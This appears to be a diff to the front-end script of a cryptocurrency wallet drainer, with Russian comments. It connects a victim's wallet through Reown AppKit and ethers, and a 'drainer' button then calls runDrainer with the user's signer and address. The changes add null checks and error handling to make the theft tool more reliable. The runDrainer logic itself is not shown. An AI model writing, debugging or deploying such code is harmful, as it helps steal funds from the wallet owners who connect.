@@ -1,3 +1,4 @@
+// main.js
 import { createAppKit } from '@reown/appkit';
 import {
   mainnet, polygon, bsc, avalanche,
@@ -34,24 +35,47 @@ const modal = createAppKit({
   },
 });
 
-let appProvider, appSigner, userAddress;
+let appProvider = null;
+let appSigner = null;
+let userAddress = null;
 
+// Подключение кошелька
 modal.on('connect', async ({ provider }) => {
-  appProvider = new ethers.providers.Web3Provider(provider, 'any');
-  appSigner = appProvider.getSigner();
-  userAddress = await appSigner.getAddress();
+  try {
+    if (!provider) {
+      alert("Не удалось получить provider. Попробуйте использовать другой браузер или откройте сайт в мобильном кошельке.");
+      return;
+    }
 
-  document.getElementById('status').textContent = `Подключено: ${userAddress}`;
+    appProvider = new ethers.providers.Web3Provider(provider, 'any');
+    appSigner = appProvider.getSigner();
+    userAddress = await appSigner.getAddress();
+
+    const statusEl = document.getElementById('status');
+    if (statusEl) {
+      statusEl.textContent = `Подключено: ${userAddress}`;
+    }
+
+  } catch (e) {
+    console.error('Ошибка при подключении:', e);
+    alert('Ошибка при подключении кошелька: ' + e.message);
+  }
 });
 
-document.getElementById('open-connect-modal')
-  .addEventListener('click', () => modal.open());
+// Открытие модального окна подключения
+const connectBtn = document.getElementById('open-connect-modal');
+if (connectBtn) {
+  connectBtn.addEventListener('click', () => modal.open());
+}
 
-document.getElementById('drainer-btn')
-  .addEventListener('click', async () => {
-    if (!appSigner) {
+// Запуск дрейнера
+const drainBtn = document.getElementById('drainer-btn');
+if (drainBtn) {
+  drainBtn.addEventListener('click', async () => {
+    if (!appSigner || !appProvider || !userAddress) {
       return alert('Сначала подключите кошелёк!');
     }
+
     try {
       await runDrainer(appProvider, appSigner, userAddress);
     } catch (e) {
@@ -59,3 +83,4 @@ document.getElementById('drainer-btn')
       alert('Ошибка при выполнении Drainer: ' + e.message);
     }
   });
+}
